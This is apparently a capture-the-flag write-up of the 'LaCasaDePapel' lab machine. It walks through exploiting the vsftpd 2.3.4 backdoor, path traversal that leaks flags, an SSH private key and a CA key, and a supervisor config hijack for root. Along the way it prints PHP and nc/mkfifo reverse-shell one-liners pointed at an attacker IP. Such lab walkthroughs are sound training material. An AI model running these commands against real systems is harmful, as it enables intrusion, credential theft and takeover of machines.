Quick enum:
```
PORT     STATE    SERVICE REASON
21/tcp   open     ftp     syn-ack ttl 63
22/tcp   open     ssh     syn-ack ttl 63
80/tcp   open     http    syn-ack ttl 63
443/tcp  open     https   syn-ack ttl 63
6200/tcp filtered lm-x    port-unreach ttl 63

```

After connecting to the webpage we observe some QRcode, so let's break through it:

```
otpauth://hotp/Token?secret=OJNCGYRXIEXVAXSNKMUHM5LPJAWHOILC&algorithm=SHA1

secret decoded in base32: rZ#b7A/P^MS(vuoH,w!b
```

We also capture the post that we can do:
```
POST / HTTP/1.1
Host: 10.10.10.131
Content-Length: 66
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.10.131
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.131/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

secret=GVREQO2OPNOW26CJFAXD4432FFPEKUKX&token=AAAA&email=a%40a.com
```

```
GET /qrcode?qrurl=otpauth%3A%2F%2Fhotp%2FToken%3Fsecret%3DOA2WI23FHF2H24B6INXCKVJTKRGGIKCW%26algorithm%3DSHA1 HTTP/1.1
Host: 10.10.10.131
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://10.10.10.131/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

```


The HTTPS server returns a certificate error, so it's time to check again the ports. FTP doesn't allow anonymous login, so let's check the other port.
After checking what the heck is `lm-x` it looks like it's a certificate 


```
test test@test.com
```

It definitely looks like we have to create a certificate by ourselves:
https://verifalia.com/help/sub-accounts/how-to-create-self-signed-client-certificate-for-tls-mutual-authentication


After some time, let's get back to the machine!

I definitely did not find anything interesting over HTTP/S servers, so let's get back to the port scanning and check for some services and versions:

- 21/tcp  open  ftp      vsftpd 2.3.4 -> Vulnerable! 
```bash
searchsploit "vsftpd 2.3.4"
searchsploit -m unix/remote/49757.py
```
And there we go with some exploitable service!

Once inside:
```
?
  help       Show a list of commands. Type `help [foo]` for information about [foo].      Aliases: ?
  ls         List local, instance or class variables, methods and constants.              Aliases: list, dir
  dump       Dump an object or primitive.
  doc        Read the documentation for an object, class, constant, method or property.   Aliases: rtfm, man
  show       Show the code for an object, class, constant, method or property.
  wtf        Show the backtrace of the most recent exception.                             Aliases: last-exception, wtf?
  whereami   Show where you are in the code.
  throw-up   Throw an exception or error out of the Psy Shell.
  timeit     Profiles with a timer.
  trace      Show the current call stack.
  buffer     Show (or clear) the contents of the code input buffer.                       Aliases: buf
  clear      Clear the Psy Shell screen.
  edit       Open an external editor. Afterwards, get produced code in input buffer.
  sudo       Evaluate PHP code, bypassing visibility restrictions.
  history    Show the Psy Shell history.                                                  Aliases: hist
  exit       End the current session and return to caller.                                Aliases: quit, q
whereami

From phar:///usr/bin/psysh/src/functions.php:307:

    302| $config['colorMode'] = Configuration::COLOR_MODE_FORCED;
    303| } elseif ($input->getOption('no-color')) {
    304| $config['colorMode'] = Configuration::COLOR_MODE_DISABLED;
    305| }
    306|
  > 307| $shell = new Shell(new Configuration($config));
    308|
    309|
    310|  if ($usageException !== null || $input->getOption('help')) {
    311| if ($usageException !== null) {
    312| echo $usageException->getMessage() . PHP_EOL . PHP_EOL;

```

Some interesting data about the certificate could be find by printing the only local class variable present:

```
dir
Variables: $tokyo
show tokyo
  > 2| class Tokyo {
    3|  private function sign($caCert,$userCsr) {
    4|          $caKey = file_get_contents('/home/nairobi/ca.key');
    5|          $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']);
    6|          openssl_x509_export($userCert, $userCertOut);
    7|          return $userCertOut;
    8|  }
    9| }

```

After some tries to type some commands we find out that there is an PHP error being thrown over `phar://eval()`, which shows that we can try something like:
```php
exec("whoami");
```

Not working, it's time to go to http://revshells.com:
```
$sock=fsockopen("10.10.16.4",31415);`sh <&3 >&3 2>&3`;
```
And BUM! Reverse shell obtained!
.... But not responding :(
```php
PHP Warning:  shell_exec() has been disabled for security reasons in phar://eval()'d code on line 2
```
After some reserch, serialization and phar-deserialization looks like a nice attack vector to exploit, so let's go for it:
https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization

```

file_get_contents("/home/nairobi/ca.key")
=> """
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
   """


```

Not even necessary to serialize nothing, great! 

To create a client certificate that is accepted by the server, you need to follow these steps: [[Cheatsheets/Create Client Certificate]]

After following the steps and entering in https://lacasadepapel.htb/ we can now access! 

We now see a lot of empty `.avi` files on it. 

Let's try some LFI and we observe something interesting:
```
# PRIVATE AREA

Error: ENOENT: no such file or directory, scandir '/home/berlin/downloads/../../../../../../../etc/paswd/'  
    at Object.fs.readdirSync (fs.js:904:18)  
    at /home/berlin/server.js:10:20  
    at Layer.handle [as handle_request] (/home/berlin/node_modules/express/lib/router/layer.js:95:5)  
    at next (/home/berlin/node_modules/express/lib/router/route.js:137:13)  
    at Route.dispatch (/home/berlin/node_modules/express/lib/router/route.js:112:3)  
    at Layer.handle [as handle_request] (/home/berlin/node_modules/express/lib/router/layer.js:95:5)  
    at /home/berlin/node_modules/express/lib/router/index.js:281:22  
    at Function.process_params (/home/berlin/node_modules/express/lib/router/index.js:335:12)  
    at next (/home/berlin/node_modules/express/lib/router/index.js:275:10)  
    at expressInit (/home/berlin/node_modules/express/lib/middleware/init.js:40:5
```

And AAAAAALLL RIGT we have a huuuge LFI over there:
https://lacasadepapel.htb/?path=../../../../../../../
And we are in `/`

Let's now check how the files are being downloaded:

```
Request URL:
https://lacasadepapel.htb/file/Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vZG93bmxvYWRzL1NFQVNPTi0xLzEwLmF2aQ==
Request Method:
GET
Status Code:
200 OK
Remote Address:
10.10.10.131:443
Referrer Policy:
strict-origin-when-cross-origin
```

And yep, it's doing a GET request to the `server/file/Base64EncodedPath`

So let's try to retrieve the user.txt flag over berlin home folder
```
https://lacasadepapel.htb/file/Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vdXNlci50eHQ=
```
And we have the user.txt flag.

After trying to access the root flag we get an error as expected:
```root.txt
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: EACCES: permission denied, open &#39;/home/berlin/downloads/../../../../../../../root/root.txt&#39;<br> &nbsp; &nbsp;at Object.fs.openSync (fs.js:646:18)<br> &nbsp; &nbsp;at Object.fs.readFileSync (fs.js:551:33)<br> &nbsp; &nbsp;at /home/berlin/server.js:32:15<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/berlin/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/home/berlin/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/home/berlin/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/berlin/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /home/berlin/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at param (/home/berlin/node_modules/express/lib/router/index.js:354:14)<br> &nbsp; &nbsp;at param (/home/berlin/node_modules/express/lib/router/index.js:365:14)</pre>
</body>
</html>
```

We go to dali's home folder and we findout some .ssh folder, which we cannot acces, but let's try to download the content anyways. Forget it, I'm stupid, there's also a .ssh folder in berlin's home:
```
../../../../../../../home/berlin/.ssh/id_rsa
../../../../../../../home/berlin/.ssh/id_rsa.pub

https://lacasadepapel.htb/file/Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vLnNzaC9pZF9yc2E=
https://lacasadepapel.htb/file/Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vLnNzaC9pZF9yc2EucHVi
```

Got it!

Let's now connect through ssh with our new id_rsa private key:
```
# To ssh via pem file (which normally needs 0600 permissions):
ssh -i <pemfile> <user>@<host>

chmod 0600 files/id_rsa
ssh -i id_rsa berlin@$(cat ip)
```

Not that easy, so let's take a look to the debug info of ssh server
```
OpenSSH_8.2p1 Ubuntu-4ubuntu0.11, OpenSSL 1.1.1f  31 Mar 2020
debug1: Reading configuration data /home/lotape6/.ssh/config
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 10.10.10.131 [10.10.10.131] port 22.
debug1: Connection established.
debug1: identity file /home/lotape6/.ssh/readme type -1
debug1: identity file /home/lotape6/.ssh/readme-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11
debug1: Remote protocol version 2.0, remote software version OpenSSH_7.9
debug1: match: OpenSSH_7.9 pat OpenSSH* compat 0x04000000
debug1: Authenticating to 10.10.10.131:22 as 'lotape6'
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: curve25519-sha256
debug1: kex: host key algorithm: ecdsa-sha2-nistp256
debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:rA99W+GVzo0hlABp1vMj9ChhjLwybPhHTpb65AWm7xI
debug1: Host '10.10.10.131' is known and matches the ECDSA host key.
debug1: Found key in /home/lotape6/.ssh/known_hosts:35
debug1: rekey out after 134217728 blocks
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: rekey in after 134217728 blocks
debug1: Will attempt key: berlin@lacasadepapel.htb RSA SHA256:99ZbBx61cCbXPTGK7T2S8CwE1pR+zcAEW8211kEK6Nw agent
debug1: Will attempt key: lotape6@mohoyoyo RSA SHA256:M3o2EKSs1DmVDimtd4CEQC5qZA47X4IopVOoJ/rN0KU agent
debug1: Will attempt key: /home/lotape6/.ssh/readme
debug1: SSH2_MSG_EXT_INFO received
debug1: kex_input_ext_info: server-sig-algs=<ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521>
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug1: Authentications that can continue: publickey,password,keyboard-interactive
debug1: Next authentication method: publickey
debug1: Offering public key: berlin@lacasadepapel.htb RSA SHA256:99ZbBx61cCbXPTGK7T2S8CwE1pR+zcAEW8211kEK6Nw agent
debug1: Authentications that can continue: publickey,password,keyboard-interactive
debug1: Offering public key: lotape6@mohoyoyo RSA SHA256:M3o2EKSs1DmVDimtd4CEQC5qZA47X4IopVOoJ/rN0KU agent
debug1: Authentications that can continue: publickey,password,keyboard-interactive
debug1: Trying private key: /home/lotape6/.ssh/readme
debug1: Authentications that can continue: publickey,password,keyboard-interactive
debug1: Next authentication method: keyboard-interactive
debug1: Authentications that can continue: publickey,password,keyboard-interactive
debug1: Next authentication method: password

```

Let's get back to the filesystem to find sensitive data:

```
../../../../../../../home/berlin/.ash_history
https://lacasadepapel.htb/file/Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vLmFzaF9oaXN0b3J5
0 B

../../../../../../../home/berlin/server.js
https://lacasadepapel.htb/file/Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vc2VydmVyLmpz
nothing new

../../../../../../../home/berlin/.ssh/known_hosts
https://lacasadepapel.htb/file/Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vLnNzaC9rbm93bl9ob3N0cw==

../../../../../../../home/berlin/.ssh/authorized_keys
https://lacasadepapel.htb/file/Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vLnNzaC9hdXRob3JpemVkX2tleXM=
https://lacasadepapel.htb/file/
https://lacasadepapel.htb/file/
https://lacasadepapel.htb/file/

```

authorized_keys, id_rsa, id_rsa.pub, known_hosts

Finally the issue here was that the stored credential was for another user. Trying each of the users we find out that the professor user was the correct one:

```
ssh professor@$(cat ip) -i  files/id_rsa
```

We run a classic linpeas.sh and find some interesting stuff:
```
╔══════════╣ Users with console
berlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash
dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh
operator:x:11:0:operator:/root:/bin/sh
postgres:x:70:70::/var/lib/postgresql:/bin/sh
professor:x:1002:1002:professor,,,:/home/professor:/bin/ash
root:x:0:0:root:/root:/bin/ash


...

operator:x:11:0:operator:/root:/bin/sh
```

Operator has /root as main folder. After taking a look to the filesystem, we find an interesting file memcached.ini which contains some potential PE vector:
```
lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```

```
lacasadepapel [~]$ ps aux | grep memcached
 3156 memcache  0:05 /usr/bin/memcached -d -p 11211 -U 11211 -l 127.0.0.1 -m 64 -c 1024 -u memcached -P /var/run/memcached/memcached-11211.pid
28768 nobody    0:08 /usr/bin/node /home/professor/memcached.js
28777 professo  0:00 grep memcached
```

We find out that we can move the memcached.ini file without modifying the permissions, so let's create a malicious script and place a new memcached.ini in order to run it as sudo!
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.4 31415 >/tmp/f' > s.sh
echo '[program:memcached]
command = sudo /bin/sh /home/professor/s.sh' > memcached.ini
```

And Boom we've got a reverse shell with root!

```
37c8...
```